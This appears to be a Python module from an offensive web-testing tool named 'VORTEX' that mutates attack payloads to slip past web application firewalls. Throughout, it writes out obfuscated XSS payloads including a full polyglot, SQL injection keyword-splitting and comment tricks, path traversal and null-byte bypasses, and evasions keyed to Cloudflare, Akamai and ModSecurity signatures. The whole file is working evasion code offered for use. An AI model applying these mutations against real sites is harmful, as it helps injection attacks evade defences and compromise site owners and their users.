"""
VORTEX Payload Mutation Engine - V18.0
Intelligent WAF bypass through payload mutations

CAPABILITIES:
- Context-aware mutations (HTML/JS/SQL/URL)
- Encoding variations (URL, Base64, Hex, Unicode)
- Case manipulation and obfuscation
- Comment injection
- Polyglot generation
- WAF signature evasion

TECHNIQUES:
- Character encoding (URL, HTML entities, Unicode)
- Case variation (random, alternating)
- Comment insertion (SQL, HTML, JS)
- String concatenation
- Null byte injection
- Double encoding
"""

import re
import random
import base64
import urllib.parse
import logging
from typing import List, Set, Optional
from enum import Enum

logger = logging.getLogger(__name__)


class PayloadContext(str, Enum):
    """Context where payload will be injected."""
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    SQL = "sql"
    URL = "url"
    GENERIC = "generic"


class MutationEngine:
    """
    Intelligent payload mutation engine.
    
    Generates variations of payloads to bypass WAF/filters.
    """
    
    def __init__(self):
        self.mutation_stats = {
            'mutations_generated': 0,
            'encoding_mutations': 0,
            'case_mutations': 0,
            'comment_mutations': 0,
            'concatenation_mutations': 0
        }
    
    def mutate(self, 
               payload: str, 
               context: PayloadContext = PayloadContext.GENERIC,
               max_mutations: int = 10) -> List[str]:
        """
        Generate mutations of payload.
        
        Args:
            payload: Original payload
            context: Injection context
            max_mutations: Maximum number of mutations to generate
            
        Returns:
            List of mutated payloads
        """
        mutations = set()
        mutations.add(payload)  # Include original
        
        # Apply context-specific mutations
        if context == PayloadContext.HTML:
            mutations.update(self._mutate_html(payload))
        elif context == PayloadContext.JAVASCRIPT:
            mutations.update(self._mutate_javascript(payload))
        elif context == PayloadContext.SQL:
            mutations.update(self._mutate_sql(payload))
        elif context == PayloadContext.URL:
            mutations.update(self._mutate_url(payload))
        
        # Apply generic mutations
        mutations.update(self._mutate_case(payload))
        mutations.update(self._mutate_encoding(payload))
        
        # Limit to max_mutations
        result = list(mutations)[:max_mutations]
        
        self.mutation_stats['mutations_generated'] += len(result)
        
        return result
    
    def _mutate_html(self, payload: str) -> Set[str]:
        """HTML context mutations."""
        mutations = set()
        
        # Case variation for tags
        if '<script>' in payload.lower():
            mutations.add(payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>'))
            mutations.add(payload.replace('<script>', '<SCRIPT>').replace('</script>', '</SCRIPT>'))
        
        # HTML entity encoding
        if 'alert' in payload:
            # Encode 'alert' as HTML entities
            encoded = '&#97;&#108;&#101;&#114;&#116;'
            mutations.add(payload.replace('alert', encoded))
        
        # Null byte injection
        mutations.add(payload + '%00')
        
        # Whitespace variations
        mutations.add(payload.replace('>', '/>'))
        mutations.add(payload.replace(' ', '%20'))
        
        # Event handler variations
        if 'onerror' in payload.lower():
            mutations.add(payload.replace('onerror=', 'OnErRoR='))
            mutations.add(payload.replace('onerror=', 'onerror%3D'))
        
        self.mutation_stats['encoding_mutations'] += len(mutations)
        return mutations
    
    def _mutate_javascript(self, payload: str) -> Set[str]:
        """JavaScript context mutations."""
        mutations = set()
        
        # String.fromCharCode encoding
        if 'alert(1)' in payload:
            # alert(1) -> alert(String.fromCharCode(49))
            mutations.add(payload.replace('alert(1)', 'alert(String.fromCharCode(49))'))
            mutations.add(payload.replace('alert(1)', 'alert(atob("MQ=="))'))  # Base64
        
        # Template literals
        if 'alert' in payload:
            mutations.add(payload.replace('alert', '`alert`'))
            mutations.add(payload.replace('alert(', '(alert)('))
        
        # Comment injection
        mutations.add(payload.replace('alert', 'al/**/ert'))
        mutations.add(payload.replace('(', '/**/('+ ''))
        
        # Unicode escape
        mutations.add(payload.replace('alert', '\\u0061\\u006c\\u0065\\u0072\\u0074'))
        
        self.mutation_stats['comment_mutations'] += len(mutations)
        return mutations
    
    def _mutate_sql(self, payload: str) -> Set[str]:
        """SQL context mutations."""
        mutations = set()
        
        # Comment variations
        mutations.add(payload.replace(' ', '/**/'))
        mutations.add(payload.replace('SELECT', 'SE/**/LECT'))
        mutations.add(payload.replace('UNION', 'UN/**/ION'))
        
        # Case variation
        mutations.add(payload.upper())
        mutations.add(payload.lower())
        mutations.add(self._random_case(payload))
        
        # Whitespace variations
        mutations.add(payload.replace(' ', '\t'))
        mutations.add(payload.replace(' ', '%20'))
        mutations.add(payload.replace(' ', '+'))
        
        # Alternative syntax
        if 'OR 1=1' in payload:
            mutations.add(payload.replace('OR 1=1', 'OR 1'))
            mutations.add(payload.replace('OR 1=1', 'OR true'))
            mutations.add(payload.replace('OR 1=1', '||1'))
        
        # Encoding
        mutations.add(payload.replace("'", "%27"))
        mutations.add(payload.replace('"', '%22'))
        
        # Null byte
        if '--' in payload:
            mutations.add(payload.replace('--', '--%00'))
        
        self.mutation_stats['comment_mutations'] += len(mutations)
        return mutations
    
    def _mutate_url(self, payload: str) -> Set[str]:
        """URL context mutations."""
        mutations = set()
        
        # URL encoding
        mutations.add(urllib.parse.quote(payload))
        mutations.add(urllib.parse.quote(payload, safe=''))
        
        # Double URL encoding
        encoded_once = urllib.parse.quote(payload, safe='')
        mutations.add(urllib.parse.quote(encoded_once, safe=''))
        
        # Hex encoding
        hex_encoded = ''.join(f'%{ord(c):02x}' for c in payload)
        mutations.add(hex_encoded)
        
        self.mutation_stats['encoding_mutations'] += len(mutations)
        return mutations
    
    def _mutate_case(self, payload: str) -> Set[str]:
        """Case variation mutations."""
        mutations = set()
        
        # All uppercase
        mutations.add(payload.upper())
        
        # All lowercase
        mutations.add(payload.lower())
        
        # Random case
        mutations.add(self._random_case(payload))
        
        # Alternating case
        mutations.add(self._alternating_case(payload))
        
        self.mutation_stats['case_mutations'] += len(mutations)
        return mutations
    
    def _mutate_encoding(self, payload: str) -> Set[str]:
        """Encoding mutations."""
        mutations = set()
        
        # Base64
        try:
            b64 = base64.b64encode(payload.encode()).decode()
            mutations.add(b64)
        except Exception:
            pass
        
        # Hex
        hex_str = payload.encode().hex()
        mutations.add(hex_str)
        
        # Unicode escape
        unicode_escaped = ''.join(f'\\u{ord(c):04x}' for c in payload)
        mutations.add(unicode_escaped)
        
        self.mutation_stats['encoding_mutations'] += len(mutations)
        return mutations
    
    def _random_case(self, text: str) -> str:
        """Randomize case of letters."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in text
        )
    
    def _alternating_case(self, text: str) -> str:
        """Alternating upper/lower case."""
        result = []
        upper = True
        for c in text:
            if c.isalpha():
                result.append(c.upper() if upper else c.lower())
                upper = not upper
            else:
                result.append(c)
        return ''.join(result)
    
    def generate_polyglot(self, payload: str) -> str:
        """
        Generate polyglot payload (works in multiple contexts).
        
        Example: Works as XSS in HTML, attribute, JS contexts
        """
        # Basic XSS polyglot template
        polyglot = (
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk='
            + payload +
            ' )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd='
            + payload +
            '//>'
        )
        
        return polyglot
    
    def get_stats(self) -> dict:
        """Get mutation statistics."""
        return self.mutation_stats.copy()


class WAFBypassGenerator:
    """
    WAF-specific bypass payload generator.
    
    Detects WAF signatures and generates evasion payloads.
    """
    
    WAF_SIGNATURES = {
        'cloudflare': [
            'script', 'onerror', 'alert', 'eval',
            'SELECT', 'UNION', 'OR 1=1'
        ],
        'akamai': [
            '../', 'etc/passwd', 'cmd=', 'exec'
        ],
        'modsecurity': [
            'union', 'select', 'information_schema',
            '<script', 'javascript:'
        ]
    }
    
    def __init__(self):
        self.mutation_engine = MutationEngine()
    
    def bypass_waf(self, 
                   payload: str, 
                   waf_type: Optional[str] = None) -> List[str]:
        """
        Generate WAF bypass variations.
        
        Args:
            payload: Original payload
            waf_type: Known WAF type (cloudflare, akamai, etc.)
            
        Returns:
            List of bypass variations
        """
        bypasses = set()
        
        # Generic bypasses
        bypasses.update(self._generic_bypasses(payload))
        
        # WAF-specific bypasses
        if waf_type and waf_type in self.WAF_SIGNATURES:
            bypasses.update(self._waf_specific_bypasses(payload, waf_type))
        
        return list(bypasses)
    
    def _generic_bypasses(self, payload: str) -> Set[str]:
        """Generic WAF bypass techniques."""
        bypasses = set()
        
        # Null byte injection
        bypasses.add(payload + '\x00')
        bypasses.add(payload + '%00')
        
        # Newline injection
        bypasses.add(payload.replace(' ', '\n'))
        bypasses.add(payload.replace(' ', '\r\n'))
        
        # Tab injection
        bypasses.add(payload.replace(' ', '\t'))
        
        # Comment injection
        bypasses.add(payload.replace(' ', '/**/'))
        
        # Mixed encoding
        bypasses.add(self._mixed_encoding(payload))
        
        return bypasses
    
    def _waf_specific_bypasses(self, payload: str, waf_type: str) -> Set[str]:
        """WAF-specific bypass techniques."""
        bypasses = set()
        
        if waf_type == 'cloudflare':
            # Cloudflare often blocks common XSS patterns
            if 'script' in payload.lower():
                bypasses.add(payload.replace('<script>', '<svg/onload='))
                bypasses.add(payload.replace('script', 'scr\x00ipt'))
        
        elif waf_type == 'akamai':
            # Akamai sensitive to path traversal
            if '../' in payload:
                bypasses.add(payload.replace('../', '..\\'))
                bypasses.add(payload.replace('../', '....//'))
        
        elif waf_type == 'modsecurity':
            # ModSecurity blocks SQL keywords
            if 'union' in payload.lower():
                bypasses.add(payload.replace('UNION', '/*!50000UNION*/'))
                bypasses.add(payload.replace('UNION', 'UN/**/ION'))
        
        return bypasses
    
    def _mixed_encoding(self, payload: str) -> str:
        """Mix different encoding techniques."""
        # Randomly encode some characters
        result = []
        for c in payload:
            if random.random() < 0.3:  # 30% chance to encode
                if c.isalpha():
                    result.append(f'%{ord(c):02x}')
                else:
                    result.append(c)
            else:
                result.append(c)
        return ''.join(result)


# Global instances
global_mutation_engine = MutationEngine()
global_waf_bypass_generator = WAFBypassGenerator()


def mutate_payload(payload: str, context: PayloadContext = PayloadContext.GENERIC, max_mutations: int = 10) -> List[str]:
    """Convenience function to mutate payload."""
    return global_mutation_engine.mutate(payload, context, max_mutations)


def bypass_waf(payload: str, waf_type: Optional[str] = None) -> List[str]:
    """Convenience function for WAF bypass."""
    return global_waf_bypass_generator.bypass_waf(payload, waf_type)